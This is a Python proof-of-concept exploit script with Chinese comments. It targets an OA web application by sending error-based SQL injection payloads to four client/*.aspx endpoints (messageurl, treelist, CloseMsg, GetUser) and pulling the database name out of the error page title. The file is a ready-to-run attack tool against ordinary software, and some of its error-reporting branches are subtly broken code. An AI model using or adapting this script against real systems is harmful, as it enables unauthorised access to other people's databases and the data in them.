import requests
import re
import sys
import random
from lxml import etree
from colorama import init

init(autoreset=True)
RED = '\x1b[1;91m'  # 红色
BLUE = '\033[1;94m'  # 蓝色
GREEN = '\033[1;32m'  # 绿色
BOLD = '\033[1m'  # 灰白
color = ['RED', 'BLUE', 'GREEN', 'BOLD']
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0'
}
str ='/'


def title():
    color = random.randint(31, 39)
    print("\033[%sm                                        _     _ _ _  __      \033[0m" % color)
    print("\033[%sm                    _ __ ___  _   _  __| | __| | (_)/ _| ___ \033[0m" % color)
    print("\033[%sm                   | '_ ` _ \| | | |/ _` |/ _` | | | |_ / _ \\\033[0m" % color)
    print("\033[%sm                   | | | | | | |_| | (_| | (_| | | |  _|  __/\033[0m" % color)
    print("\033[%sm                   |_| |_| |_|\__,_|\__,_|\__,_|_|_|_|  \___|\033[0m" % color)


def Check_url(url):
    if url[-1] != '/':
        url += '/'
    return url


# 构造url,返回一个列表
def Structure_url(url):
    url_list = []
    massageurl_url = url + "client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1"
    treelist_url = url + "client/treelist.aspx?user=' and (select db_name())>0--&pwd=1"
    CloserMSg_url = url + "client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1"
    GetUser_url = url + "client/GetUser.aspx?user=' and (select db_name())>0--&pwd=1"
    url_list.append(massageurl_url)
    url_list.append(treelist_url)
    url_list.append(CloserMSg_url)
    url_list.append(GetUser_url)
    return url_list


# poc1检测
def Poc1(url):
    response = requests.get(url=url, headers=headers,timeout=5).content.decode('gbk')
    result = etree.HTML(response)
    content = result.xpath('/html/head/title/text()')[0]
    rule = "'(.+?)'"
    target_db = re.findall(rule, content)
    url = url.split("' and (select db_name())>0--")
    if not target_db:
        print(RED + "[INFO]" + "url：" + url + " 不存在SQL注入漏洞")
    else:
        # 输出数据库名字
        print(BLUE + "[Successfully]" + "url：" + url[0]+url[1] + " 存在SQL注入漏洞")
        print(GREEN + "[Successfully]" + "数据库名为：" + BLUE + target_db[0])


# poc2检测
def Poc2(url):
    response = requests.get(url=url, headers=headers,timeout=5).content.decode('gbk')
    result = etree.HTML(response)
    content = result.xpath('/html/head/title/text()')[0]
    rule = "'(.+?)'"
    target_db = re.findall(rule, content)
    url = url.split("' and (select db_name())>0--")
    if not target_db:
        print(RED + "[INFO]" + "url：" + url + " 不存在SQL注入漏洞")
    else:
        # 输出数据库名字
        print(BLUE + "[Successfully]" + "url：" + url[0]+url[1] + " 存在SQL注入漏洞")
        print(GREEN + "[Successfully]" + "数据库名为：" + BLUE + target_db[0])


# poc3检测
def Poc3(url):
    response = requests.get(url=url, headers=headers,timeout=5).content.decode('gbk')
    result = etree.HTML(response)
    content = result.xpath('/html/head/title/text()')[0]
    rule = "'(.+?)'"
    target_db = re.findall(rule, content)
    url = url.split("' and (select db_name())>0--")
    if not target_db:
        print(RED + "[INFO]" + "url：" + url[:url.index[str]] + " 不存在SQL注入漏洞")
    else:
        # 输出数据库名字
        print(BLUE + "[Successfully]" + "url：" + url[0]+url[1] + " 存在SQL注入漏洞")
        print(GREEN + "[Successfully]" + "数据库名为：" + BLUE + target_db[0])


# Poc4检测
def Poc4(url):
    response = requests.get(url=url, headers=headers,timeout=5).content.decode('gbk')
    result = etree.HTML(response)
    content = result.xpath('/html/head/title/text()')[0]
    rule = "'(.+?)'"
    target_db = re.findall(rule, content)
    url = url.split("' and (select db_name())>0--")
    if not target_db:
        print(RED + "[INFO]" + url + " 不存在SQL注入漏洞")
    else:
        # 输出数据库名字
        print(BLUE + "[Successfully]" + "url：" + url[0]+url[1] + " 存在SQL注入漏洞")
        print(GREEN + "[Successfully]" + "数据库名为：" + BLUE + target_db[0])


func_dict = {1: Poc1, 2: Poc2, 3: Poc3, 4: Poc4}


def Exploit(url_list):
    for index, url in enumerate(url_list):
        number = index + 1
        print(BOLD + "[*]" + "正在检测漏洞点{}，请稍等.......".format(number))
        try:
            # 根据索引调用不同的POC
            func_dict.get(number)(url)
        except:
            print(RED + "[*]" + "检测错误，该网站不存在漏洞")


if __name__ == '__main__':
    title()
    if len(sys.argv) != 2:
        print(BLUE + "[*] Usage: Poc.py <OA URL> example: poc.py http://192.168.216.165:8090")
        exit()
    url = sys.argv[1]
    Exploit(Structure_url(Check_url(url)))
